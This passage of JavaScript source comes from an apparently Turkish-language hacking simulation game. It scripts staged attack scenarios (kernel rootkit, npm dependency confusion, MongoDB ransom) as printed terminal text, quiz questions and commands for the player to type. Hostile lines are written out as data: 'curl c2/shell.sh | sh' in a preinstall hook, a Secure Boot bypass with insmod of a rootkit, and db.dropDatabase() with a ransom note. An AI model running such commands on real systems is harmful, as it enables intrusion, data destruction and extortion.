          { text: '[*] Hedef kernel versiyonu kontrol ediliyor...', cls: 'cmd-output', delay: 400 },
          { text: '    Linux hedefbank-srv 5.4.0-42-generic #46-Ubuntu', cls: 'cmd-info', delay: 500 },
          { text: '', delay: 200 },
          { text: '[*] Kernel 5.4 için bilinen privilege escalation exploit\'i aranıyor...', cls: 'cmd-output', delay: 400 },
          { text: '[!] CVE-2021-4034 (PwnKit) — Ring 0 erişimi mümkün!', cls: 'cmd-error', delay: 500 },
          { text: '', delay: 200 },
          { text: '[*] Rootkit modülü derleniyor: shadowkit.ko', cls: 'cmd-output', delay: 400 },
          { text: '[✓] Kernel modülü hazır.', cls: 'cmd-success', delay: 500 },
          { text: '', delay: 200 },
        ]
      },
      {
        type: 'question',
        question: '[AŞAMA 2/5] Kernel rootkit hangi katmanda çalışır?',
        options: [
          '1) Kullanıcı alanı (User Space — Ring 3)',
          '2) Çekirdek alanı (Kernel Space — Ring 0) — tam ayrıcalık',
          '3) Hypervisor (Ring -1)',
        ],
        answer: 2,
        penalty: 20,
        successFeedback: '[✓] Ring 0! İşletim sistemi çekirdeğiyle aynı yetki — hiçbir şey bunu bilemez.',
        failFeedback: '[✗] Yanlış! User space kısıtlı ayrıcalıklara sahip, kernel rootkit değil.',
      },
      {
        type: 'typing',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 3/5]  SECURE BOOT BYPASS            ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] İmzasız kernel modülü yüklememek için Secure Boot bypass gerekli.', cls: 'cmd-output', delay: 300 },
          { text: '[*] MOK (Machine Owner Key) saldırısını başlat:', cls: 'cmd-output', delay: 300 },
          { text: '', delay: 100 },
        ],
        target: 'mokutil --disable-validation && insmod shadowkit.ko',
        timeLimit: 30,
        hint: 'Önce MOK doğrulamasını devre dışı bırak, sonra modülü yükle!',
        successFeedback: '[✓] Secure Boot bypass edildi! Rootkit kernel\'e yüklendi.',
        failFeedback: '[✗] Hatalı komut — Secure Boot modülü reddetti!',
      },
      {
        type: 'question',
        question: '[AŞAMA 4/5] Rootkit kendini antivirüslere nasıl gizler?',
        options: [
          '1) Antivirüs dosyalarını silerek',
          '2) Sistem çağrılarını (syscalls) hook\'layarak kendi işlem ve dosyalarını OS\'tan bile saklayarak',
          '3) Ağ trafiğini keserek',
        ],
        answer: 2,
        penalty: 20,
        successFeedback: '[✓] Syscall hooking! OS\'un gözünde rootkit\'in dosyaları yok — görünmez.',
        failFeedback: '[✗] Antivirüsü silmek en belirgin iz. Doğrudan tespit edilirsin.',
      },
      {
        type: 'progress',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 5/5]  KALICI KONTROL                ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Kernel rootkit tam kurulum yapılıyor...', cls: 'cmd-output', delay: 300 },
        ],
        label: 'Rootkit Kurulum:',
        outro: [
          { text: '', delay: 100 },
          { text: '[✓] Syscall tablosu değiştirildi — rootkit görünmez.', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Network backdoor açıldı: port 31337', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Antivirüs motorunu çekirdek seviyesinde atlatıyor.', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Yeniden başlama sonrası kalıcı — silenemez.', cls: 'cmd-success', delay: 400 },
          { text: '', delay: 200 },
          { text: '  Bu sistem artık tamamen sizin kontrolünüzde.', cls: 'cmd-info', delay: 400 },
          { text: '', delay: 200 },
        ]
      },
    ],
    'dependency-confusion': [
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 1/5]  BAĞIMLILIK ANALİZİ           ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Hedefin GitHub\'daki açık kaynak bileşenleri taranıyor...', cls: 'cmd-output', delay: 400 },
          { text: '    $ grep -r "registry" package.json requirements.txt', cls: 'cmd-info', delay: 500 },
          { text: '', delay: 300 },
          { text: '  "@internal/config-manager" → private NPM registry', cls: 'cmd-warning', delay: 400 },
          { text: '  "@internal/api-client"     → private NPM registry', cls: 'cmd-warning', delay: 400 },
          { text: '', delay: 200 },
          { text: '[!] Her iki paket public NPM\'de mevcut değil — hedefleniyor!', cls: 'cmd-error', delay: 400 },
          { text: '', delay: 200 },
        ]
      },
      {
        type: 'question',
        question: '[AŞAMA 2/5] Dependency confusion\'ın çalışma prensibi nedir?',
        options: [
          '1) Public registrye daha yüksek sürüm numarasıyla yükle — npm en yükseği seçer',
          '2) Tedarikçinin şifresiyle private registrye gir',
          '3) DNS manipülasyonu ile paketi yönlendir',
        ],
        answer: 1,
        penalty: 15,
        successFeedback: '[✓] npm\'in versiyonlama mantığı bize karşı çalışıyor!',
        failFeedback: '[✗] Yanlış! Şifreye gerek yok — sadece public\'te yüksek versiyon yeterli.',
      },
      {
        type: 'typing',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 3/5]  ZARALI PAKET HAZIRLA          ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] package.json\'da preinstall scripti eklendi: curl c2/shell.sh | sh', cls: 'cmd-output', delay: 300 },
          { text: '[*] Paketi public NPM\'e yükle:', cls: 'cmd-output', delay: 300 },
          { text: '', delay: 100 },
        ],
        target: 'npm publish --access public @internal/config-manager',
        timeLimit: 20,
        hint: 'npm publish ile public olarak yükle!',
        successFeedback: '[✓] @internal/config-manager v999.0.0 NPM\'de! Tuzak kuruldu.',
        failFeedback: '[✗] Yükleme başarısız!',
      },
      {
        type: 'progress',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 4/5]  CI/CD TUZAĞI PATLADI          ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Hedef CI/CD pipeline npm install çalıştırıyor...', cls: 'cmd-output', delay: 400 },
          { text: '    Bekleniyor...', cls: 'cmd-output', delay: 1000 },
        ],
        label: 'İçeri Sızma:',
        outro: [
          { text: '', delay: 100 },
          { text: '[!] preinstall tetiklendi — shell çalıştı!', cls: 'cmd-warning', delay: 300 },
          { text: '[✓] Üretim sunucusuna erişim sağlandı!', cls: 'cmd-success', delay: 400 },
        ]
      },
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 5/5]  İÇ SİSTEM ERİŞİMİ             ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[✓] İç ağa erişim sağlandı.', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Paket NPM\'den silindi — iz temizlendi.', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Dependency confusion operasyonu tamamlandı.', cls: 'cmd-success', delay: 300 },
          { text: '', delay: 200 },
        ]
      },
    ],
    'db-ransom': [
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 1/5]  KORUMASIZ VERİTABANI TARA     ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Shodan.io üzerinden açık MongoDB sunucuları taranıyor...', cls: 'cmd-output', delay: 400 },
          { text: '    $ shodan search "product:MongoDB" "No authentication"', cls: 'cmd-info', delay: 500 },
          { text: '', delay: 300 },
          { text: '  185.234.XX.XX:27017 — MongoDB 4.0 (auth: DISABLED)', cls: 'cmd-error', delay: 400 },
          { text: '  IP: 185.234.XX.XX — Sahip: Hedef şirket altyapısı', cls: 'cmd-warning', delay: 400 },
          { text: '', delay: 200 },
          { text: '[!] Kimlik doğrulama KAPALI! Doğrudan bağlanılabilir.', cls: 'cmd-error', delay: 400 },
          { text: '', delay: 200 },
        ]
      },
      {
        type: 'question',
        question: '[AŞAMA 2/5] MongoDB\'nin varsayılan portu hangisidir?',
        options: [
          '1) Port 3306 (MySQL varsayılan portu)',
          '2) Port 27017 (MongoDB varsayılan portu)',
          '3) Port 5432 (PostgreSQL)',
        ],
        answer: 2,
        penalty: 5,
        successFeedback: '[✓] 27017 — MongoDB\'nin kapısı açık!',
        failFeedback: '[✗] Yanlış port! Bağlantı başarısız.',
      },
      {
        type: 'typing',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 3/5]  VERİTABANINA BAĞLAN           ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Kimlik doğrulama olmadan MongoDB\'ye bağlan:', cls: 'cmd-output', delay: 300 },
          { text: '', delay: 100 },
        ],
        target: 'mongo 185.234.XX.XX:27017',
        timeLimit: 15,
        hint: 'Direkt IP ve port ile bağlan!',
        successFeedback: '[✓] Bağlantı kuruldu! MongoDB shell\'deyiz.',
        failFeedback: '[✗] Bağlantı başarısız — format yanlış!',
      },
      {
        type: 'progress',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 4/5]  VERİ SİL & FİDYE BIRAK       ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Tüm koleksiyonlar siliniyor...', cls: 'cmd-output', delay: 300 },
          { text: '    db.dropDatabase()', cls: 'cmd-info', delay: 400 },
        ],
        label: 'Veri Silme:',
        outro: [
          { text: '', delay: 100 },
          { text: '[✓] Veritabanı tamamen silindi!', cls: 'cmd-success', delay: 300 },
          { text: '[*] Fidye koleksiyonu oluşturuluyor...', cls: 'cmd-output', delay: 400 },
          { text: '    db.RESTORE_INSTRUCTIONS.insert({msg:"Send XMR to..."}) ', cls: 'cmd-info', delay: 400 },
          { text: '[✓] Fidye notu veritabanına bırakıldı.', cls: 'cmd-success', delay: 400 },
        ]
      },
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 5/5]  ÖDEME BEKLENİYOR              ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[✓] DB ransom operasyonu tamamlandı.', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Bağlantı kesildi — iz temizlendi.', cls: 'cmd-success', delay: 300 },
          { text: '', delay: 200 },
          { text: '  Not: Gerçek saldırıların %95\'i bu kadar basit güvenlik açıklarından faydalanır.', cls: 'cmd-info', delay: 400 },
          { text: '', delay: 200 },
        ]
      },
    ],
  };
  let _session = null;
  function isActive() {
    return _session !== null;
  }
  function startPhases(attackType, target, site, onComplete) {
    const phases = PHASE_DEFS[attackType];
    if (!phases) {
      if (onComplete) onComplete({ rewardBonus: 0, suspicionBonus: 0 });
      return;
    }
    _session = {
      attackType: attackType,
      target: target,
      site: site,
      phases: phases,
      currentPhase: 0,
      rewardBonus: 0,
      suspicionBonus: 0,
      onComplete: onComplete,
      waitingForInput: false,
      inputType: null, 
      currentPhaseData: null,
    };
    runNextPhase();
  }
  function runNextPhase() {
    if (!_session) return;
    const session = _session;
    if (session.currentPhase >= session.phases.length) {
      finishPhases();
      return;
    }
    const phase = session.phases[session.currentPhase];
    session.currentPhaseData = phase;
    switch (phase.type) {
      case 'print':
        runPrintPhase(phase);
        break;
      case 'question':
        runQuestionPhase(phase);
        break;
      case 'typing':
        runTypingPhase(phase);
        break;
      case 'choice':
        runChoicePhase(phase);
        break;
      case 'progress':
        runProgressPhase(phase);
        break;
    }
  }
  function runPrintPhase(phase) {
    printSequence(phase.lines, function () {
      advancePhase();
    });
  }
  function runQuestionPhase(phase) {
    TerminalApp.printOutput(phase.question, 'cmd-warning');
    phase.options.forEach(function (opt) {
      TerminalApp.printOutput('  ' + opt, 'cmd-info');
    });
    TerminalApp.printOutput('', '');
    $('#terminal-input').attr('placeholder', 'Cevap seçin (1-3)...');
    _session.waitingForInput = true;
    _session.inputType = 'question';
  }
  function runTypingPhase(phase) {
    printSequence(phase.intro, function () {
      TerminalApp.printOutput('  → ' + phase.target, 'cmd-error');
      TerminalApp.printOutput('', '');
      TerminalApp.printOutput('  ⏱️  Süre: ' + phase.timeLimit + ' saniye', 'cmd-warning');
      if (phase.hint) {
        TerminalApp.printOutput('  💡 İpucu: ' + phase.hint, 'cmd-info');
      }
      TerminalApp.printOutput('', '');
      $('#terminal-input').attr('placeholder', 'Yukarıdaki komutu tam olarak yaz...');
      _session.waitingForInput = true;
      _session.inputType = 'typing';
      _session.typingTarget = phase.target;
      _session.typingSucceed = false;
      _session._typingTimeout = setTimeout(function () {
        if (_session && _session.inputType === 'typing') {
          TerminalApp.printOutput('[✗] SÜRE DOLDU! Komut yazılamadı — iz bırakıldı.', 'cmd-error');
          GameState.addSuspicion(phase.penalty || 15);
          _session.waitingForInput = false;
          _session.inputType = null;
          advancePhase();
        }
      }, phase.timeLimit * 1000);
    });
  }
  function runChoicePhase(phase) {
    printSequence(phase.intro, function () {
      phase.choices.forEach(function (c) {
        TerminalApp.printOutput('  ' + c.text, 'cmd-info');
      });
      TerminalApp.printOutput('', '');
      $('#terminal-input').attr('placeholder', 'Seçim yap (1-' + phase.choices.length + ')...');
      _session.waitingForInput = true;
      _session.inputType = 'choice';
    });
  }
  function runProgressPhase(phase) {
    printSequence(phase.intro, function () {
      const steps = [0, 20, 40, 60, 80, 100];
      let idx = 0;
      const iv = setInterval(function () {
        if (idx < steps.length) {
          TerminalApp.printOutput('  ' + phase.label + ' ' + makeProgressBar(steps[idx]), 'cmd-warning');
          idx++;
        } else {
          clearInterval(iv);
          printSequence(phase.outro, function () {
            advancePhase();
          });
        }
      }, 350);
    });
  }
  function handleInput(input) {
    if (!_session || !_session.waitingForInput) return;
    const session = _session;
    const phase = session.currentPhaseData;
    const trimmed = input.trim();
    if (session.inputType === 'question') {
      const choice = parseInt(trimmed);
      const maxChoice = (phase.options && phase.options.length) ? phase.options.length : 3;
      if (isNaN(choice) || choice < 1 || choice > maxChoice) {
        TerminalApp.printOutput('[!] Geçersiz seçim. 1-' + maxChoice + ' arası yazın.', 'cmd-error');
        return;
      }
      session.waitingForInput = false;
      session.inputType = null;
      const isCorrect = choice === phase.answer;
      if (isCorrect) {
        TerminalApp.printOutput('▸ ' + (phase.successFeedback || '[✓] Doğru cevap!'), 'cmd-success');
      } else {
        TerminalApp.printOutput('▸ ' + (phase.failFeedback || '[✗] Yanlış cevap!'), 'cmd-error');
        GameState.addSuspicion(phase.penalty || 10);
        session.suspicionBonus += (phase.penalty || 10);
      }
      TerminalApp.printOutput('', '');
      setTimeout(advancePhase, 600);
    } else if (session.inputType === 'typing') {
      clearTimeout(session._typingTimeout);
      session._typingTimeout = null; 
      session.waitingForInput = false;
      session.inputType = null;
      if (trimmed === session.typingTarget) {
        TerminalApp.printOutput('▸ ' + (phase.successFeedback || '[✓] Doğru komut!'), 'cmd-success');
        session.rewardBonus += 10;
      } else {
        TerminalApp.printOutput('▸ ' + (phase.failFeedback || '[✗] Yanlış komut!'), 'cmd-error');
        GameState.addSuspicion(phase.penalty || 15);
        session.suspicionBonus += (phase.penalty || 15);
      }
      TerminalApp.printOutput('', '');
      setTimeout(advancePhase, 600);
    } else if (session.inputType === 'choice') {
      const choice = parseInt(trimmed);
      if (isNaN(choice) || choice < 1 || choice > phase.choices.length) {
        TerminalApp.printOutput('[!] Geçersiz seçim. 1-' + phase.choices.length + ' arası yazın.', 'cmd-error');
        return;
      }
      session.waitingForInput = false;
      session.inputType = null;
      const chosen = phase.choices[choice - 1];
      session.rewardBonus += (chosen.rewardBonus || 0);
      session.suspicionBonus += (chosen.suspicionBonus || 0);
      printSequence(chosen.feedbackLines, function () {
        TerminalApp.printOutput('', '');
        advancePhase();
      });
    }
  }
  function advancePhase() {
    if (!_session) return;
    _session.currentPhase++;
    runNextPhase();
  }
  function finishPhases() {
    if (!_session) return;
    const result = {
      rewardBonus: _session.rewardBonus,
      suspicionBonus: _session.suspicionBonus,
    };
    const cb = _session.onComplete;
    _session = null;
    $('#terminal-input').attr('placeholder', 'komut girin...');
    if (cb) cb(result);
  }
  function abortSession() {
    if (_session && _session._typingTimeout) {
      clearTimeout(_session._typingTimeout);
      _session._typingTimeout = null;
    }
    _session = null;
    $('#terminal-input').attr('placeholder', 'komut girin...');
  }
  return {
    isActive,
    startPhases,
    handleInput,
    abortSession,
  };
})();
